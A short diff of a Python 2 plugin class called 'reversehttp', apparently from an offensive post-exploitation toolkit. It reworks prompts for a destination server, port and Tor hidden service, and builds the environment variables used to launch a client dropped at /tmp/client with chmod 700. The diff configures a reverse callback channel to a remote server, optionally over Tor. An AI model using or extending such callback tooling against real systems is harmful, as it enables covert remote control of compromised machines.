@@ -72,11 +72,10 @@ class reversehttp(basePlugin):
 		self.tor=True
 		self.hidden_service=raw_input("Hidden service name (Just Enter to use the hardcoded value)?: ").strip("\n")
 		if self.hidden_service=="": print  "Using the default value"
-	
-	dest=raw_input("Destination server [%s]: " % self.server).strip("\n")
-	if dest!="": self.server=dest
 
-	if mode!="yes":
+	else:
+		dest=raw_input("Destination server [%s]: " % self.server).strip("\n")
+		if dest!="": self.server=dest
 		dest_port=raw_input("Destination port [%s]: " % self.port).strip("\n")
 		if dest_port!="": self.port=dest_port
 		
@@ -113,10 +112,10 @@ class reversehttp(basePlugin):
 		haxhelper.executeSystemCommand("chmod 700 /tmp/client")
 
 		if self.tor==True:
-    			if hidden_service=="":
-				env_string="PYSERVER_IP='%s' TOR_MODE='yes'" % (self.server)
+    			if self.hidden_service=="":
+				env_string="TOR_MODE='yes'" 
 			else:
-				env_string="PYSERVER_IP='%s' HIDDEN_SERVICE='%s' TOR_MODE='yes'" % (self.server,self.hidden_service)
+				env_string="HIDDEN_SERVICE='%s' TOR_MODE='yes'" % (self.hidden_service)
 		else:
 			env_string="PYSERVER_IP='%s' PYSERVER_PORT='%s'" % (self.server,self.port)
 
